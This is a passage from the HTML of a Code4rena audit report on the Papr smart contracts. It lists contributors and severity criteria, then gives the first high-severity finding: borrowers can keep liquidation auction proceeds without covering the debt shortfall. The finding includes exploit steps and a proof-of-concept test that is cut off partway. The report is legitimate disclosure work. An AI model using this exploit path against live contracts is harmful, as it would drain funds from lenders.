{
  "circa": {
    "title": "Papr contest",
    "sponsor": "Backed Protocol",
    "slug": "2022-12-backed",
    "date": "2023-01-31",
    "findings": "https://github.com/code-423n4/2022-12-backed-findings/issues",
    "contest": 196
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Papr smart contract system written in Solidity. The audit contest took place between December 16—December 21 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>64 Wardens contributed reports to the Papr contest:</p>\n<ol>\n<li>0x52</li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/0xalpharush\">0xalpharush</a></li>\n<li>0xhacksmithh</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>Awesome</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>Bnke0x0</li>\n<li>Bobface</li>\n<li>Breeje</li>\n<li>Diana</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>HE1M</li>\n<li>HollaDieWaldfee</li>\n<li>IllIllI</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>KingNFT</li>\n<li>Koolex</li>\n<li>Mukund</li>\n<li>RaymondFam</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SaharDevep</li>\n<li>Saintcode_</li>\n<li>Secureverse (imkapadia, Nsecv and leosathya)</li>\n<li>SmartSek (0xDjango and hake)</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li>__141345__</li>\n<li>ak1</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>chrisdior4</li>\n<li>evan</li>\n<li><a href=\"https://twitter.com/eyexploit\">eyexploit</a></li>\n<li>fs0c</li>\n<li>gz627</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>hihen</li>\n<li>imare</li>\n<li>ladboy233</li>\n<li>lukris02</li>\n<li>noot</li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>poirots (<a href=\"https://twitter.com/DavideSilva_\">DavideSilva</a>, resende, naps62 and eighty)</li>\n<li>rbitbytes</li>\n<li>rjs</li>\n<li>rotcivegaf</li>\n<li>rvierdiiev</li>\n<li><a href=\"https://medium.com/@saneryee-studio\">saneryee</a></li>\n<li>shark</li>\n<li><a href=\"https://twitter.com/Stealthyzzzz\">stealthyz</a></li>\n<li><a href=\"https://twitter.com/teawaterwire\">teawaterwire</a></li>\n<li>tnevler</li>\n<li>unforgiven</li>\n<li>wait</li>\n<li>yixxas</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/trust1995\">trust1995</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 34 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 15 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-12-backed\">C4 Papr contest repository</a>, and is composed of 5 smart contracts, 4 libraries, and 4 interfaces written in the Solidity programming language and includes 1,043 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-4\" style=\"position:relative;\"><a href=\"#high-risk-findings-4\" aria-label=\"high risk findings 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (4)</h1>\n<h2 id=\"h-01-borrowers-may-earn-auction-proceeds-without-filling-the-debt-shortfall\" style=\"position:relative;\"><a href=\"#h-01-borrowers-may-earn-auction-proceeds-without-filling-the-debt-shortfall\" aria-label=\"h 01 borrowers may earn auction proceeds without filling the debt shortfall permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/97\">[H-01] Borrowers may earn auction proceeds without filling the debt shortfall</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/97\">hihen</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/214\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/136\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/70\">HollaDieWaldfee</a></em></p>\n<p>The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assume N is an allowed NFT, B is a borrower, the vault V is <code>_vaultInfo[B][N]</code>:</p>\n<ol>\n<li>B add two NFTs (N-1 and N-2) as collaterals to vault V.</li>\n<li>B <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138\">increaseDebt()</a> of vault V.</li>\n<li>The vault V becomes liquidatable.</li>\n<li>Someone calls <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297\">startLiquidationAuction()</a> to liquidate collateral N-1.</li>\n<li>No one buys N-1 because the price of N is falling.</li>\n<li>After <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41\">liquidationAuctionMinSpacing - 2days</a>, someone calls <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297\">startLiquidationAuction()</a> to liquidate collateral N-2.</li>\n<li>Someone calls <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264\">purchaseLiquidationAuctionNFT</a> to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isLastCollateral</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// there will be debt left with no NFTs, set it to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_reduceDebtWithoutBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"8\">\n<li>Someone calls <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264\">purchaseLiquidationAuctionNFT</a> to purchase N-2. All the excess will be transferred to B because <code>neededToSaveVault</code> is 0 and <code>debtCached</code> is 0:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleExcess</span><span class=\"mtk1\">(</span><span class=\"mtk12\">excess</span><span class=\"mtk1\">, </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.</strong>\nTest code for PoC:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">diff</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">git</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">paprController</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PoC</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">paprController</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PoC</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">file</span><span class=\"mtk1\"> </span><span class=\"mtk10\">mode</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">index</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0000000</span><span class=\"mtk1\">..0</span><span class=\"mtk12\">b12914</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">--- /</span><span class=\"mtk12\">dev</span><span class=\"mtk1\">/</span><span class=\"mtk4\">null</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+++ </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">paprController</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PoC</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span><span class=\"mtk7\">147</span><span class=\"mtk1\"> @@</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk3\">// SPDX-License-Identifier: GPL-2.0-or-later</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">17</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;solmate/tokens/ERC721.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../src/ReservoirOracleUnderwriter.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">BasePaprControllerTest</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./BasePaprController.ft.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../src/interfaces/IPaprController.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PoC</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BasePaprControllerTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// mint a second collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// add collaterals, loan max and sells</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">_addCollaterals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">_loanMaxAndSell</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// borrower now has 2.9... USD</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">), </span><span class=\"mtk7\">2.9e6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk3\">// prepare purchaser</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proceedsTo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">purchaser</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapParams</span><span class=\"mtk1\">.</span><span 